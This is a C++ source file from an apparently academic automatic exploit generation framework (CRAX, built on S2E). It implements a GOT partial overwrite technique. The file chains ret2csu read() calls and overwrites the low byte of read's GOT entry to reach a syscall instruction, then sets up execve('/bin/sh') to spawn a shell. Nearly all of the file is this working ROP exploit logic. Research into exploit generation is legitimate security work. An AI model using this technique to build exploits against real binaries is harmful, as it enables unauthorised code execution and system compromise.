// Copyright 2021-2022 Software Quality Laboratory, NYCU.
//
// Permission is hereby granted, free of charge, to any person obtaining a copy
// of this software and associated documentation files (the "Software"), to deal
// in the Software without restriction, including without limitation the rights
// to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
// copies of the Software, and to permit persons to whom the Software is
// furnished to do so, subject to the following conditions:
//
// The above copyright notice and this permission notice shall be included in all
// copies or substantial portions of the Software.
//
// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
// IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
// FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
// AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
// LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
// OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
// SOFTWARE.

#include <s2e/Plugins/CRAX/CRAX.h>
#include <s2e/Plugins/CRAX/Techniques/Ret2csu.h>
#include <s2e/Plugins/CRAX/Utils/StringUtil.h>

#include <cassert>
#include <fstream>

#include "GotPartialOverwrite.h"

namespace s2e::plugins::crax {

using SymbolicRopPayload = Technique::SymbolicRopPayload;
using ConcreteRopPayload = Technique::ConcreteRopPayload;


GotPartialOverwrite::GotPartialOverwrite(CRAX &ctx) : Technique(ctx) {
    resolveRequiredGadgets();
}


bool GotPartialOverwrite::checkRequirements() const {
    return true;
}

void GotPartialOverwrite::resolveRequiredGadgets() {
}

std::string GotPartialOverwrite::getAuxiliaryFunctions() const {
    return "";
}

std::vector<SymbolicRopPayload> GotPartialOverwrite::getSymbolicRopPayloadList() const {
    Ret2csu *ret2csu = dynamic_cast<Ret2csu *>(Technique::s_mapper["Ret2csu"]);
    assert(ret2csu);

    auto symbolMap = m_ctx.getExploit().getElf().symbols();
    auto gotMap = m_ctx.getExploit().getElf().got();

    // Modify LSB of got['read'], setting RAX to 1.
    uint64_t addr = symbolMap["read"];
    uint64_t arg1 = 0;
    uint64_t arg2 = gotMap["read"];
    uint64_t arg3 = 1;
    SymbolicRopPayload read1 = ret2csu->getSymbolicRopPayloadList(addr, arg1, arg2, arg3)[0];

    // write(1, 0, 0), setting RAX to 0.
    addr = symbolMap["read"];
    arg1 = 1;
    arg2 = 0;
    arg3 = 0;
    SymbolicRopPayload read2 = ret2csu->getSymbolicRopPayloadList(addr, arg1, arg2, arg3)[0];

    // Read "/bin/sh" into elf.bss(), setting RAX to 59.
    addr = symbolMap["read"];
    arg1 = 0;
    arg2 = m_ctx.getExploit().getElf().bss();
    arg3 = 59;
    SymbolicRopPayload read3 = ret2csu->getSymbolicRopPayloadList(addr, arg1, arg2, arg3)[0];

    // Return to sys_execve.
    addr = symbolMap["read"];
    arg1 = m_ctx.getExploit().getElf().bss();
    arg2 = 0;
    arg3 = 0;
    SymbolicRopPayload read4 = ret2csu->getSymbolicRopPayloadList(addr, arg1, arg2, arg3)[0];

    SymbolicRopPayload part1;
    SymbolicRopPayload part2;
    SymbolicRopPayload part3;

    part1.reserve(1 + read1.size() + read2.size() + read3.size() + read4.size());
    part1.push_back(ConstantExpr::create(0, Expr::Int64));
    part1.insert(part1.end(), read1.begin(), read1.end());
    part1.insert(part1.end(), read2.begin(), read2.end());
    part1.insert(part1.end(), read3.begin(), read3.end());
    part1.insert(part1.end(), read4.begin(), read4.end());

    log<WARN>() << "read syscall gadget LSByte = " << klee::hexval(getLsbOfReadSyscall()) << '\n';
    part2 = { ByteVectorExpr::create(std::vector<uint8_t> { getLsbOfReadSyscall() }) };
    part3 = { ByteVectorExpr::create(ljust("/bin/sh", 59, 0x00)) };

    return {part1, part2, part3};
}

ConcreteRopPayload GotPartialOverwrite::getExtraPayload() const {
    return {0};  // rbp
}

std::string GotPartialOverwrite::toString() const {
    return "GotPartialOverwrite";
}


uint8_t GotPartialOverwrite::getLsbOfReadSyscall() const {
    // Get __read() info from libc.
    auto f = m_ctx.getExploit().getLibc().functions()["__read"];

    std::vector<uint8_t> code(f.size);
    std::ifstream ifs(m_ctx.getExploit().getLibcFilename(), std::ios::binary);
    ifs.seekg(f.address, std::ios::beg);
    ifs.read(reinterpret_cast<char*>(code.data()), f.size);

    uint64_t syscallOffset = -1;
    for (auto i : m_ctx.getDisassembler().disasm(code, f.address)) {
        if (i.mnemonic == "syscall") {
            syscallOffset = i.address;
            assert((syscallOffset & 0xff00) == (f.address & 0xff00));
            break;
        }
    }
    return syscallOffset & 0xff;
}

}  // namespace s2e::plugins::crax